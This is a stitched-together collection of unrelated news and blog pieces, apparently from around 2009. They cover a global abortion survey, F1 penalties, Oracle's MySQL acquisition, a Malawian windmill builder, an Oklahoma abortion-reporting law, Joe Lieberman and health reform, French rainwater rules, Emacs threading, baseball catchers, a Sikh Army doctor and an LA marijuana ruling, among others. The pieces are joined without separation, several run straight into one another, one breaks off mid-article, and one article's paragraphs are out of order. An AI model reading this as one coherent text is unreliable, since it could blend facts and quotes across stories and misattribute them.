NEW YORK — Increased contraceptive use has led to fewer abortions worldwide , but deaths from unsafe abortion remain a severe problem , killing 70,000 women a year , a research institute reported Tuesday in a major global survey .
More than half the deaths , about 38,000 , are in sub-Saharan Africa , which was singled out as the region with by far the lowest rates of contraceptive use and the highest rates of unintended pregnancies .
The report , three years in the making , was compiled by the New York - based Guttmacher Institute , which supports abortion rights and is a leading source of data on abortion - related trends .
Researchers examined data from individual countries and multinational organizations .
The institute 's president , Sharon Camp , said she was heartened by the overall trends since Guttmacher conducted a similar survey in 1999 , yet expressed concern about the gap revealed in the new report .
" In almost all developed countries , abortion is safe and legal , " she said .
" But in much of the developing world , abortion remains highly restricted , and unsafe abortion is common and continues to damage women 's health and threaten their survival . "
The report calls for further easing of developing nations ' abortion laws , a move criticized by Deirdre McQuade , a policy director with the U.S. Conference of Catholic Bishops ' Secretariat for Pro-Life Activities .
" We need to be much more creative in assisting women with supportive services so they do n't need to resort to the unnatural act of abortion , " she said .
Guttmacher estimated previously that the number of abortions worldwide fell from 45.5 million in 1995 to 41.6 million in 2003 -- the latest year for which global figures were available .
A key reason for that drop , the new report said , was that the portion of married women using contraception increased from 54 percent in 1990 to 63 percent in 2003 as availability increased and social mores changed .
Guttmacher 's researchers said contraceptive use had increased in every major region , but still lagged badly in Africa -- used by only 28 percent of married women there , compared with at least 68 percent in other major regions .
The report notes that abortions worldwide are declining even as more countries liberalize their abortion laws .
Since 1997 , it said , only three countries -- Poland , Nicaragua and El Salvador -- substantially increased restrictions on abortion , while laws were eased significantly in 19 countries and regions , including Cambodia , Nepal and Mexico City .
Despite this trend , the report said 40 percent of the world 's women live in countries with highly restrictive abortion laws , virtually all of them in the developing world .
This category includes 92 percent of the women in Africa and 97 percent in Latin America , it said .

Five Formula 1 drivers were given penalties for not lifting off during a yellow - flag period in qualifying for the Japanese Grand Prix .
Championship leader Jenson Button , team - mate Rubens Barrichello , Renault driver Fernando Alonso , Force India 's Adrian Sutil and Toro Rosso 's Sebastien Buemi were given five - place grid penalties after the session .
The race stewards deemed the first four drivers had not lifted off sufficiently at the end of Q2 , when Buemi had crashed , leaving debris on track .
Brawn team boss Ross Brawn said his drivers , who had not set a time until then , had not lifted at all .
" No , they swerved to avoid the problem .
But they did n't lift off , no , " said Brawn .
Swiss driver Buemi was also reprimanded by the stewards for driving back to the pits with a damaged car and impeding other drivers .
Button had qualified in seventh , Barrichello in fifth , Alonso in 12th , Sutil in fourth and Buemi in 10th .

Monty Widenius , one of the original cofounders of MySQL , issued a statement Monday articulating his latest views about Oracle 's acquisition of Sun .
He shares the European Commission 's concern that the deal will reduce competitiveness between database vendors , suggesting that Oracle should sell MySQL , a move that would demonstrate to regulators and the market that the acquisition is not going to erode choice .
Database giant Oracle reached an agreement to acquire Sun earlier this year following a failed bid by IBM .
The acquisition represents major consolidation for the database market because Sun owns MySQL , the most prominent open source database platform .
EU regulators have temporarily halted the acquisition so that they can study the potential implications .
Sun acquired MySQL last year and has faced a steady barrage of criticism over its handling of ongoing development .
Widenius condemned Sun 's release management practices when MySQL 5.1 was released last year with serious bugs .
He finally abandoned Sun in February , citing dissatisfaction with the direction that MySQL was going under Sun 's ownership .
Widenius launched his own company , Monty Program Ab , in order to focus on developing his own MySQL fork called MariaDB .
He also founded the Open Database Alliance which consists of independent vendors that provide services relating to MySQL or develop various forks .
Widenius has previously said that the organization could potentially help create a more transparent and community - driven development environment for moving the open source database forward in collaboration with Oracle .
In his latest statement , he takes a much stronger position and calls for Oracle to turn over development entirely to someone else by selling MySQL .
" [ Oracle should ] be constructive and commit to sell MySQL to a suitable third party , enabling an instant solution instead of letting Sun suffer much longer , " he wrote .
" MySQL needs a different home than Oracle , a home where there will be no conflicts of interest concerning how , or if , MySQL should be developed further . "
Widenius has enlisted consultant Florian Mueller to help communicate his message to the European Commission during the ongoing regulatory investigation .
Meuller is well known in the open source software community for his efforts as the mastermind behind a 2004 lobbying campaign against software patents in Europe .
Meuller is heading back to Brussels to represent Monty Program Ab and the MySQL community .
In a public statement , he had some strong words for Oracle and called for the deal to receiver tougher scrutiny .
" Every day that passes without Oracle excluding MySQL from the deal is further evidence that Oracle just wants to get rid of its open source challenger and that the EU 's investigation is needed to safeguard innovation and customer choice , " he said .
" This is highly critical because the entire knowledge - based economy is built on databases . "
Oracle CEO Larry Ellison has firmly rejected the prospect of selling off MySQL .
He argues that the open source database does n't compete with Oracle 's enterprise products .
The two database offerings target different sections of the market , he contends .
It 's unclear if the EU regulators will accept his view and allow the deal to move forward , but the delays are certainly damaging .
While the EC is conducting its investigation , IBM is cannibalizing Sun 's server business and picking the bones clean .
Ellison says that Sun is losing roughly $ 100 million per month .
There might not be much left for Oracle by the time the acquisition is approved .

( CNN ) -- William Kamkwamba dreamed of powering his village with the only resource that was freely available to him .
William Kamkwamba fits a lightbulb to a house in his village in Malawi .
His native Malawi had gone through one of its worst droughts seven years ago , killing thousands .
His family and others were surviving on one meal a day .
The red soil in his Masitala hometown was parched , leaving his father , a farmer , without any income .
But amid all the shortages , one thing was still abundant .
Wind .
" I wanted to do something to help and change things , " he said .
" Then I said to myself , ' If they can make electricity out of wind , I can try , too . ' "
Kamkwamba was kicked out of school when he could n't pay $ 80 in school fees , and he spent his days at the library , where a book with photographs of windmills caught his eye .
" I thought , this thing exists in this book , it means someone else managed to build this machine , " he said .
Armed with the book , the then - 14 - year - old taught himself to build windmills .
He scoured through junkyards for items , including bicycle parts , plastic pipes , tractor fans and car batteries .
For the tower , he collected wood from blue - gum trees .
" Everyone laughed at me when I told them I was building a windmill .
They thought I was crazy , " he said .
" Then I started telling them I was just playing with the parts .
That sounded more normal . "
That was 2002 .
Now , he has five windmills , the tallest at 37 feet .
He built one at an area school that he used to teach classes on windmill - building .
The windmills generate electricity and pump water in his hometown , north of the capital , Lilongwe .
Neighbors regularly trek across the dusty footpaths to his house to charge their cellphones .
Others stop by to listen to Malawian reggae music blaring from a radio .
When he started building the first windmill in 2002 , word that he was " crazy " spread all over his village .
Some people said he was bewitched -- a common description for people with perplexing behavior in some African cultures .
" All of us , even my mother , thought that he had gone mad , " said his sister Doris Kamkwamba .
Villagers would surround him to snicker and point , Kamkwamba said .
Ignoring them , he would quietly bolt pieces using a screwdriver made of a heated nail attached to a corncob .
The heat -- from both the crowd and the melted , flattened pipes he used as blades -- did not deter him .
Three months later , his first windmill churned to life as relief swept over him .
As the blades whirled , a bulb attached to the windmill flickered on .
" I wanted to finish it just to prove them wrong , " he said .
" I knew people would then stop thinking I was crazy . "
Kamkwamba , now 22 , is a student at the African Leadership Academy , an elite South African school for young leaders .
Donors pay for his education .
His story has turned him into a globetrotter .
Former U.S. Vice President Al Gore , an avid advocate of green living , has applauded his work .
Kamkwamba is invited to events worldwide to share his experience with entrepreneurs .
During a recent trip to Palm Springs , California , he saw a real windmill for the first time -- lofty and majestic -- a far cry from the wobbly , wooden structures that spin in his backyard .
Former Associated Press correspondent Bryan Mealer , who covered Africa , wrote a book , " The Boy Who Harnessed the Wind , " after hearing Kamkwamba 's story .
The book was released in the United States last week .
Mealer , a native of San Antonio , Texas , said he lived with Kamkwamba in his village for months to write the book .
The story was a refreshing change after years of covering bloody conflicts in the region , Mealer said .
Kamkwamba is part of a generation of Africans who are not waiting for their governments or aid groups to come to their rescue , according to the author .
" They are seizing opportunities and technology , and finding solutions to their own problems , " Mealer said .
" One of the keys of his success is ... he 's never wanted to rest on his laurels . "

There are lots of reasons to loathe the New York City subway , but one very good reason to love it —
Helvetica , the typeface that ’s used on its signage .
Seeing the clean , crisp shapes of those letters and numbers at station entrances , on the platforms and inside the trains is always a treat , at least it is until I spot the “ Do not lean ... ” sign on the train doors .
Ugh !
There ’s something not quite right about the “ e ” and the “ a ” in the word “ lean . ”
Somehow they seem too small and too cramped .
Once I ’ve noticed them , the memory of the clean , crisp letters fades , and all I remember are the “ off ” ones .
That ’s the problem with loving typography .
It ’s always a pleasure to discover a formally gorgeous , subtly expressive typeface while walking along a street or leafing through a magazine .
( Among my current favorites are the very elegant letters in the new identity of the Paris fashion house , Céline , and the jolly jumble of multi-colored fonts on the back of the Rossi Ice Cream vans purring around London . )
But that joy is swiftly obliterated by the sight of a typographic howler .
It ’s like having a heightened sense of smell .
You spend much more of your time wincing at noxious stinks , than reveling in delightful aromas .

If it ’s bad for me ( an amateur enthusiast who is interested in typography , but is n’t hugely knowledgeable about it ) , what must it be like for the purists ?
Dreadful , it seems .
I feel guilty enough about grumbling to my friends whenever I see this or that typographic gaffe , but am too ignorant to spot all of them , unlike the designers who work with typefaces on a daily basis , and study them lovingly .
A new Oklahoma law that forces women who have had abortions to post details of the procedure online is being sharply criticized by women ’s rights groups , and is now being challenged in court by two Oklahoma women .
As of November 1 , doctors in Oklahoma will be compelled — under penalty of criminal prosecution — to post the details of each abortion they perform online .
Among the details to be posted for every abortion is the patient ’s age , marital status and race ; her financial condition ; her education ; and the total number of her previous pregnancies .
ADVERTISEMENT
In all , 37 personal questions will have to be asked and answered , and posted publicly for the world to see , under the new law .
“ A friend said it best :
It ’s like undressing women in public , exposing their most personal issues on the Internet , ” Lora Joyce Davis , one of the plaintiffs suing to prevent the law from coming into effect , told ABC News .
While the abortion patient ’s name will not be published , “ critics say the first eight questions alone could easily lead to the identification of a woman who lives in one of the state ’s many small communities , ” ABC reports .
Davis is convinced the lives of Oklahoma women who receive abortions will be threatened by the law , which is known as the Statistical Reporting of Abortions Act .
“ Women who have abortions are considered murderers by many people , and you are going to put the name of a town of 200 and the fact that the girl is 17 and it ’s her first pregnancy and she in the 10th grade .
People are going to know who it is , ” Davis said .
ADVERTISEMENT
Davis , along with former state Rep. Wanda Jo Stapleton , filed the lawsuit with the help of the Center for Reproductive Rights .
The lawsuit seeks to have the law declared unconstitutional under the Oklahoma Constitution because it covers more than one subject .
Jennifer Mondino , a lawyer for CRR , told the UK Guardian that the law is designed to “ make women more nervous about going to [ abortion ] doctors . ”
“ The intent of this law is to further restrict access to abortions in Oklahoma , ” she said .
“ There are a number of states that have a reporting requirement but not as broad and detailed as in Oklahoma .
It ’s very unusual to consider putting such detail about patients on a Web site . ”
ADVERTISEMENT
The law has come under extreme criticism from social activists .
The Feminists for Choice blog declares the law invalid under the 1996 Health Insurance Portability and Accountability Act .
“ A major goal of the Privacy Rule is to assure that individuals ’ health information is properly protected while allowing the flow of health information needed to provide and promote high quality health care and to protect the public ’s health and well being , ” blogger Reyna writes .
“ This law does quite the opposite .
Instead of protecting patients , this law puts these [ women ] in danger . ”
ADVERTISEMENT
“ Why do n’t we just tattoo a Scarlett “ A ” on their foreheads ? ” blogger Mike the Mad Biologist asks at ScienceBlogs .
According to CCR , nearly one - quarter of women in the United States have to travel more than 50 miles for an abortion .
The number of abortion doctors in the US has declined 25 percent since 1992 , and a full 87 percent of US counties do n’t have an abortion provider , despite the Supreme Court declaring the procedure legal in 1973 .

Lieberman brushes off critics
Sen .
Joe Lieberman ’s threat to filibuster any health care bill with a public option could kill health reform this year — and embolden Democratic challengers who ’d like to send him packing in 2012 .
But Lieberman does n’t seem worried .

“ I do n’t think about that stuff , ” Lieberman told POLITICO this week .
“ I ’m just — I ’m being a legislator .
After what I went through in 2006 , there ’s nothing much more that anybody [ who ] disagrees with me can try to do . ”
Lieberman left the Democratic Party in 2006 after liberal Ned Lamont beat him in Connecticut ’s Democratic Senate primary .
Lieberman defeated Lamont in the general election and returned to Washington as an independent , where he continues to caucus with Democrats — even though he accuses them of engaging in a bit of bait and switch when it comes to the public option .
“ It ’s classic politics of our time that if you look at the campaign last year , presidential , you ca n’t find a mention of public option , ” Lieberman said .
“ It was added after the election as a part of what we normally consider health insurance reform — insurance market reforms , cover people , cover people who are not covered .
In fact , the 2008 Democratic Party Platform referred to the need for a “ public plan , ” and candidate Barack Obama referred more than once to the idea of providing people who ca n’t get private insurance with government - backed insurance similar to that which members of Congress get .
But Lieberman says support for the public option has now become a “ litmus test ” for Democrats , adding : “ I thought Democrats were against litmus tests . ”
Despite the strong words against some in his old party , Lieberman still entertains the idea of a reunion .
Asked this week if he might run again as a Democrat in 2012 , Lieberman smiled and said , “ Yeah , sure . ”
“ I ’m for health care reform , ” Lieberman told POLITICO .
“ And , of course , this will all be over by then , and I hope we will be strongly supporting health care reform .
I have n’t changed my thoughts about 2012 , which is , I ’m keeping all my options open .
“ The wonderful thing of being an independent : You have options . ”
Sen. John Thune ( R - S.D. ) , No. 4 in the Senate GOP leadership , said if Lieberman wants to become a Republican , he “ would be welcomed , and there would be a real effort to make him feel at home . ”
But when it comes to the Democratic Party , political experts and polls suggest that Lieberman ’s options may be more limited .
“ My sense is that when he announced he would filibuster the public option , he was saying goodbye to the Democratic Party , ” said Doug Schwartz , director of the Quinnipiac University poll in Hamden , Conn .
“ My sense is , that was the straw that broke the camel ’s back . ”
In a new Quinnipiac poll , Connecticut voters said by a 2 - to - 1 margin that Lieberman ’s views on the issues put him closer to Republicans than to Democrats .
And just 12 percent of the respondents said he should run as a Democrat if he runs again in 2012 ; 55 percent said he should remain an independent , while 20 percent said he should cross over completely and run as a Republican .
In an interview , Richard Blumenthal , the state attorney general , said he ’s getting more encouragement from Democrats in Connecticut to consider a challenge to Lieberman in 2012 .
A February Quinnipiac poll found that Blumenthal would beat Lieberman by a 28 - point margin .
A September Research 2000 poll found that Republican Gov. M. Jodi Rell would defeat both Blumenthal and Lieberman in a potential three - way 2012 matchup ; the same poll found that 68 percent of the state ’s voters support the public option .
Blumenthal has long signaled an interest in the seat and may have an opening now that Lamont appears to be prepared to run for governor and Rell has announced she wo n’t seek a third term next year .
Blumenthal said he was first focusing on his own reelection bid in 2010 before “ considering other options ” for the 2012 cycle .
“ I ’m disappointed by his threat to filibuster and effectively kill all health reform , ” said Blumenthal , adding that there have been “ depths and breadths ” of anger at Lieberman over his position on the public option .
Democratic strategists in the state said that Blumenthal may not be alone in sensing an opportunity against Lieberman , with some also pointing to two - term Rep. Chris Murphy ( D - Conn . ) as a potential challenger .
George Jepsen , a former state party chairman and former state Senate majority leader , said that Lieberman may be attempting to endear himself to GOP voters , since he could potentially win in 2012 by picking off 75 percent of Republican voters , about half of the independent vote and about one - quarter of Democrats .
“ He ’s really burned every bridge in sight , ” Jepsen said of Lieberman ’s relationship with the Democratic Party .
Lieberman , the Democrats ’ 2000 vice presidential nominee , campaigned for Republican John McCain in 2008 and criticized Democrat Barack Obama on foreign policy issues .
Sympathetic Democrats have long insisted that Lieberman is an important ally on domestic issues .
But by vowing to block a vote on the public option , he has distanced himself from the party on a key domestic policy front .
Lieberman said it ’s the “ wrong time ” to create a government insurance program , claiming it would increase the national debt , probably raise taxes and increase premiums for insurance holders .
But Democrats said that Lieberman is employing GOP talking points in distorting the virtues of a public option , noting it ’s the one entity that could control costs — by adding a major new provider to the marketplace that would force private insurers to reduce their costs .
And while other centrist senators have expressed reservations about the public option , no Democrat has gone so far as to threaten a filibuster , which could only be defeated with 60 votes .
Lieberman said he wo n’t block efforts to begin the debate , but he will filibuster a public option to end the debate .
Senate Majority Whip Dick Durbin ( D - Ill . ) said he did n't want to speculate how Senate Democrats would deal with a Lieberman filibuster , but he pushed back on calls from the left to threaten Lieberman .
" A harder line does not deliver votes , " Durbin said .
" In the end , we need 60 votes .
We want to work with Sen. Lieberman -- try to -- if we can resolve any differences that he has and come up with a bill that we can all support . "

Récupération d’eau de pluie : feu sur les " passagers clandestins ! "
La récupération individuelle des eaux pluviales , furieusement tendance , est une catastrophe pour les finances de Veolia - Suez - Saur , et des collectivités locales .
Haro sur les doux rêveurs qui veulent « sauver la planète » mais niquent le bénéfice des susdits .
Ca ne va pas se passer comme çà .
Et de fait , le CIEau ( officine de propagande des mêmes ) , et le MEEDDM vont faire déposer par M. Bruno Sido , rapporteur de la LEMA au Sénat , l’amendement qui tue du projet de loi Grenelle 2 .
Nous allons encore chagriner nos amis de la bande à toilettes sèches .
Bon , c’est pas faute de vous avoir prévenus .
On se souvient qu’un crédit d’impôt avait été instauré consécutivement à la promulgation de la Lema du 30 décembre 2006 , destiné à financer un dispositif individuel de récupération d’eaux pluviales .
Coup de force d’un quarteron de députés UMP qui avait rendu furieux les très sages professionnels et experts du « monde de l’eau » , qui y voyaient , pas complètement à tort , quasiment la fin du monde …
Du coup , quand un peu plus tard les mêmes ont riposté en établissant un cadre réglementaire abominablement restrictif à l’innocent hobby , qui comble d’aise la galaxie de nos zamis de « l’Ecosan - toilettes sèches - bio à tous les étages - habitats en paille » et tout le bastringue , que nous avions dûment avertis de ne pas se réjouir trop vite , la déception fut amère
Car ne voilà - t-y pas qu’il fallait quasiment répondre à un cahier des charges d’AREVA qui construit un EPR pour bricoler au fond du jardin : « l’eau de pluie doit être utilisée à l’extérieur du bâtiment pour le jardin ou le lavage d’une automobile , ou à l’intérieur mais uniquement pour l’évacuation des toilettes , le lavage des sols et le lave - linge .
De plus , la signalisation est obligatoire , via un ensemble d’étiquetage « eau non potable » et marquage des canalisations de distribution ; étant donné que les eaux de pluie , par définition , ne sont pas concernées par les limites de qualité réglementaires définies pour l’eau potable , tout raccordement avec le réseau de distribution d’eau destinée à la consommation humaine est interdit .
Cependant , un système de disconnexion ( par surverse totale ) doit être installé de façon permanente pour satisfaire les besoins lorsque le réservoir de stockage d’eau de pluie est vide ». Etc. , etc .
Sauf qu’au - delà de nos sympathiques zamis le mouvement gagne , surtout chez les pères de familles bricolos , frappés par la crise comme tout un chacun , qui veulent bien sauver la planète , mais se soucient surtout d’élaguer un brin les factures astronomiques ( ce n’est qu’un début ) , de nos Trois Sœurs en furie , qui flippent à mort en voyant leur martingale tourner à l’eau de boudin …
Du coup ça contre - attaque sévère .
Et d’une , en avril dernier l’ineffable Centre d’information sur l’eau ( CIEau ) , bras armé de Veolia - Suez - Saur , dégaine l’un de ces sondages dont il a le secret et sonne le tocsin :
« En 2008 , 25 % des Français habitant en maison individuelle avaient un récupérateur d’eau de pluie , selon le Baromètre du Centre d’information sur l’eau ( C.I.EAU ) ».
Comme on n’imagine pas Mme Chotard ( chairwowan du CIEau ) , sillonner la France de long en large pour aboutir à ce chiffre terrifiant , on se demande bien où le CIEau a été pêcher cela …
( Bon d’accord un coup de tableau Excel bidouillé par un(e ) stagiaire , et comme personne ne va vérifier quoi que ce soit , roule ma poule !)
Mais pour M. Jean - Pierre Rideau , de la Direction de l’eau et de la biodiversité du Meeddm ( bien connu de nos services as « The Satese ’s killer » ) , nous apprend le JDLE , « il existe un risque de « passagers clandestins » du service d’assainissement » , c’est - à- dire des usagers non payants du service d’assainissement .
Il est en effet difficile de contrôler en continu tous les réseaux d’eaux pluviales individuels .
Pour contrer ce problème , un amendement a été déposé dans le cadre du projet de loi Grenelle II .
Cet amendement 914 vise à prévoir une déclaration pour l’utilisation d’eau de pluie à des fins domestiques .
Ceci permettra d’une part le contrôle des installations et , d’autre part , l’application de la taxe d’assainissement sur les rejets d’eaux usées .
A l’échelle des collectivités , la récupération de l’eau de pluie pose également deux autres problèmes , estime Jean - Pierre Rideau .
Elle diminue l’assiette du service de l’eau , et d’autre part elle risque d’accentuer le ratio consommation de pointe sur consommation moyenne , les deux conduisant à des difficultés supplémentaires pour le gestionnaire d’eau .
( Entendez - vous au bout des tuyaux la plainte du " cash - flow " ?)
En faisant l’hypothèse que les foyers équipés d’un système d’eaux pluviales récupèrent 3 à 10 mètres cubes par an , le Meeddm calcule que cela affecterait les ventes d’eau de 0,5 à 1,5 % au niveau national , et de 1 à 3 % en milieu rural .
« Pour les petits services de gestion de l’eau , qui desservent moins de 3500 habitants , cela peut avoir un impact local très significatif » , indique Jean - Pierre Rideau .
( On voit ici combien nos amis zélus sont attentifs avant de signer un contrat avec Veolia - Suez - Saur , que ledit Jean - Pierre Rideau n’est pas vraiment réputé les vouer aux gémonies ... )
De plus , en cas de sécheresse dans les régions rurales , les consommations issues du réseau de distribution d’eau potable risquent brutalement d’augmenter .
Résultat , les services gestionnaires d’eau risquent de ne pas pouvoir financer certains travaux sans augmenter le prix du mètre cube , a fortiori si l’équilibre du contrat de délégation de service a été construit sur la base des ventes constatées avant la diminution .
Face à cette problématique , évoquée lors d’une journée organisée le 29 septembre dernier par l’Office international de l’eau ( OIEau ) , portant sur les impacts des nouvelles exigences sur le coût du service et le prix de l’eau , des réponses sont toutefois possibles , veut nous rassurer le MEEDDM .
« Certains acteurs de l’eau préconisent de ne pas encourager la récupération d’eau de pluie dans les régions où la ressource n’est pas en danger .
En dehors de cette solution radicale , « des campagnes d’économie d’eau , comme le suggère Jean - Pierre Rideau , permettraient par exemple d’accroître le mouvement , et d’annuler ainsi les renforcements de capacité coûteux ».
« Le développement de l’intercommunalité ainsi qu’une meilleure modularité des projets de renforcement de capacité , avec des solutions plus progressives ou plus décentralisées , permettraient de continuer à encourager la récupération d’eau de pluie , sans nuire au bon fonctionnement des services collectifs de gestion d’eau .
Et bien sûr , l’amélioration des connaissances des services par l’usager , puisque « la moitié des gens croient encore que l’eau potable vient directement des stations d’épuration dans leur robinet » , rappelle Jean - Pierre Rideau .
Pour la décroissance verte , on repassera …
En espérant qu’un expert es- passagers clandestins , du genre Eric " Fondation Veolia " Besson , ne va pas venir y ajouter son grain de sel ...

I ’ve recanted .
Contrary to my earlier post on this topic , I now think implementing threading in Emacs is possible .
A patch from Giuseppe Scrivano inspired me , and I started my own patch to do it .
This was sort of fun .
I wrote a batch script in elisp to rewrite some of the Emacs sources — yay semantic patching !
Thanks to Giuseppe , this is now hosted on Gitorious .
We ’re both working there , on different branches , merging code back and forth .
I ’ve mostly been working on variable bindings , and he ’s very active , both with low - level changes and cool things getting Gnus to work in a separate thread .
If you ’re interested in helping out , we discuss it on emacs - devel , but really we ’d welcome any sort of contact .
Who is the fourth best catcher in baseball heading into 2010 ( click here to see our initial rankings for 2010 ) ?
Is it Ryan Doumit , who was limited to just 75 games in 2009 due to a wrist injury ?
What about Miguel Montero , who seemingly came from nowhere to emerge as one of the better hitting catchers in the game ?
Let ’s take a look :
Power :
Since hitting 10 home runs in 214 at bats in 2007 , people have talked about Montero ’s power potential , but sharing time with Chris Snyder never allowed him to fully realize it .
Once Snyder went down with an injury , Montero got his opportunity for regular playing time and quickly made the most of it .
His 16 home runs in 425 at bats may not be overly impressive , but it is not only a repeatable number , but one that could grow .
He posted a flyball rate of just 36.4 % in 2009 , below his career mark of 40.5 % .
Over his minor league career , his flyball rate was at 46.1 % .
With a home run per flyball rate of 12.7 % , it is very maintainable .
So , if he were to simply put a few more balls in the air , more home runs would come with it .
To make things more interesting , Montero turns 27 - years old midway through the 2010 season .
He ’s entering his prime , so adding even more power is certainly possible .
It ’s a potentially perfect storm with Montero , who saw only eight catchers hit more home runs than him in 2009 .
With more at bats , it is very possible that Montero increases his total well into the 20s , possibly to 25 .
As for Doumit , while he hit 10 home runs in just 280 at bats last season , it ’s right around where he has been throughout his career .
His flyball rate was 39.7 % , around his career mark of 36.3 % .
His HR / FB rate was 10.8 % , similar to his career mark of 11.5 % .
He is the type of player that he has shown himself to be in the past , a player who , if healthy , can come in to the 15 - 20 home run range .
The health is the biggest concern , having never played more than 116 games during his major league career .
Advantage : Montero
Batting Average :
A career .273 hitter , Doumit really shined in 2008 when he hit .318 .
It came courtesy of a believable .338 batting average and an incredible ability to make consistent contact , striking out just 12.8 % of the time .
The strikeout rate is likely not maintainable , as it jumped to 17.5 % last season , right along his career mark of 18.8 % .
With an increase in strikeouts , the higher average is not likely to continue , but he still should be in the .280-.290 mark .
Montero is a very similar player , striking out 18.4 % of the time last season en route to a .294 average .
His BABIP was a believable .329 , very similar to the numbers that Doumit posted .
The difference ?
With Montero ’s ability to hit a few extra home runs , that gives him a slight advantage in the average department as well .
Advantage : Montero
Run Production :
These are both players who are likely to hit in the middle of their respective line - ups .
Montero spent 77 at bats hitting fourth and 174 hitting fifth .
While the Diamondbacks were not the most explosive offense in the league , they also had several players who performed well below average .
If people like Stephen Drew and Chris Young can return to what is expected of them , Montero should easily be given ample opportunity to both drive in and score runs .
The Pirates , meanwhile , were dead last in the league in runs scored in 2009 and it appears unlikely that they suddenly develop into an offense that piles on the runs .
They are young and are going to develop , which should see them take a step forward , but it would n’t be a surprise if they are once again in the bottom five in the league .
While Doumit is likely to slot into the middle of the line - up , he ’s not going to be surrounded with the type of talent Montero is .
Advantage : Montero
Conclusion :
While Doumit is likely to be a great buy low candidate in 2010 , it appears that this is a clean sweep .
The two players are actually very close , so while Montero is going to move up on the rankings I would n’t recommend reaching to get him .
A player like Doumit , potentially a few rounds later , could be just as valuable .
Obviously , it is too early to see exactly where these two will be falling in drafts , but the next time the catcher rankings come out Doumit will certainly be moved below Montero .
What do you think ?

( CNN ) --
The U.S Army has granted a member of a religious minority permission to keep his turban , beard and uncut hair while he serves in the military , the Pentagon and a group representing him said .
Capt .
Kamaljit Singh Kalsi , a doctor , is a Sikh , a faith that calls on its adherents not to shave or cut their hair .
Kalsi filed a request in the spring for an accommodation to follow the principles of his religion .
This month the Army granted his request , the Sikh Coalition told CNN .
The Pentagon public affairs office later confirmed that Kalsi would be allowed to keep his turban , beard and uncut hair .
The civil rights group hailed the move as " a major step toward ending a 23 - year - old policy that excludes Sikhs from service . "
Kalsi said he was " overjoyed . "
" Like the many Sikhs who fought before me , I know I will serve America with honor and excellence , " he said in a written statement .
But the Sikh Coalition provided what it said was a copy of the letter from the Army .
Maj . Gen. Gina Farrisee said in the letter that Kalsi's " beard , uncut hair , and turban will be neat and well maintained at all times . "
She said her ruling applies only to Kalsi 's case , and is not a change of Army policy .
" This accommodation is based solely on the facts and circumstances of your case , " the letter said .
" This accommodation does not constitute a blanket accommodation for any other individual . "
She said the exception could be revoked " due to changed conditions . "
Her letter was dated October 22 and released by the Sikh Coalition the next day .
Kalsi is not the only Sikh asking permission to keep his hair , beard and turban while serving in the Army .
Capt .
Tejdeep Singh Rattan , a dentist , applied at the same time as Kalsi .
His case has been deferred until he receives the results of his dental board examinations , the Sikh Coalition told CNN .
Both were scheduled to report for active duty in July .
The Sikh Coalition said Kalsi and Rattan had been assured when they were recruited to join the Army 's Health Professions Scholarship that their unshorn hair and turbans " would not be a problem . "
" Both are concluding their training and are slated to begin active duty in July 2009 .
However , the U.S. Army is now disputing their ability to serve with their Sikh identity intact , " the Sikh Coalition said in an April 14 letter addressed to Defense Secretary Robert Gates .
" It does n't make sense to me , especially in these hard times , " Kalsi told CNN at the time .
" The military is hurting for professionals .
They need doctors , they need nurses . "
Amardeep Singh , the head of the Sikh Coalition , told CNN in the spring that the issue affects observant Sikhs , not those Sikh - Americans who entered the military after removing their turbans and shaving their beards and hair .
The issue is important for the roughly 500,000 - strong American Sikh community , Singh said .
Sikhs faced hostility after the September 11 , 2001 , attacks , when people associated them with al Qaeda terrorists because their turbans and beards resembled the militants ' appearance .
The Sikh religion was founded in India .
" The perception is still there , " Singh said .
" We 're sort of still feeling it . "
He said surveys chronicle the problems Sikhs face .
Among them is one conducted in the Queens borough of New York City recently in which children reported being on the receiving end of verbal and physical abuse , he said .
" These kids are being harassed in New York .
It 's Queens , the most diverse county in the United States .
If this is happening in Queens , it 's happening in other parts of the country . "
So , he said , the opportunity to serve in the U.S.
Army sends the opposite message -- " that we are part and parcel of the fabric of this country . "
CNN's Joe Sterling in Atlanta , Georgia , contributed to this report .
Sega Outrun GPS video arcade console scooter -- Click above to view the video after the jump
When we hear the phrase " contemporary artist " we usually say , " Just show us what you 're doing because there 's little chance we 'll understand rationale . "
Garnet Hertz , the artist in question , is combining a Sega Outrun arcade console with an EVT America Electric Trike ( a three - wheeled scooter ) , an iPhone , and custom GPS software .
The result will be a drivable arcade game -- like on the road at up to 20 mph -- that overlays Outrun graphics on live GPS maps .
The GPS software finds the vanishing point of the road and then , in the manner of Google Maps ' hybrid setting , puts the Outrun Testarossa and road into the live - action setting .
The iPhone 's internals keep track of progress and keep the screen moving in ' real - time .
'
If you really want to know the rationales , they are the " Un-Simulation of Driving , " and " GPS Navigation Parallax & Mixed Reality . "
Make of those what you will , just know they involve " obfuscation . "
Sadly , deception and inveigling were n't mentioned .

You might be asking yourself , " Why is ZooBorns posting a story on domestic cats ? "
Look closely though ...
These are European Wildcats .
Snapped at Germany 's Opel Zoo just yesterday by Joachim S Muller , the kittens are fine examples of this species native to Western , Central , and Eastern Europe .
Studies suggest that all domestic cats are descended from the Wildcat , of which the European Wildcat is a subspecies .

Although the injunction applies only to Green Oasis , the judge 's ruling calls into question the city 's power to enforce the moratorium against hundreds of dispensaries that have opened in the last two years .
The ruling could inspire other dispensaries to join the lawsuit or file similar actions .
Green Oasis and a number of other medical marijuana collectives sued the city last month , challenging its efforts to control the dispensaries .
The lawsuit argued that the City Council violated state law when it extended the ban until mid-March and that it is unconstitutionally vague .
Judge James C. Chalfant determined that the city failed to follow state law when it extended its initial moratorium .
" The city can not rely on an expired ordinance , " he said .
A Superior Court judge concluded today that Los Angeles ' moratorium on new medical marijuana dispensaries is invalid and granted a preliminary injunction against enforcement of the ban sought by a dispensary that had sued the city .
Despite the moratorium , the city has seen explosive growth in the number of dispensaries .
Under the ban , the city allowed 186 outlets to remain open .
Many more – the exact number is unknown – are operating in neighborhoods across the city , and more continue to open .
In its answer to the lawsuit , the city argued that the moratorium is not subject to the conditions and limitations of state law because it is not an ordinance dealing with zoning , but with public safety .
Zoning ordinances cannot be extended beyond 24 months .
The city adopted the first of two moratoriums on Aug. 1 , 2007 .
The judge rejected that argument .
The city also argued that a decision to issue an injunction would cause " grave irreparable harm . "
" This lawsuit is not just about one ' bad apple . '
It is about illegally dealing marijuana , " the city 's answer said .
" Hundreds of unlawful marijuana stores have cropped up throughout the City and will likely attempt to bootstrap their illegal operation on the outcome of this action . "
Jeri Burge , an assistant city attorney , told the judge this morning that granting the injunction would " reward illegal conduct . "
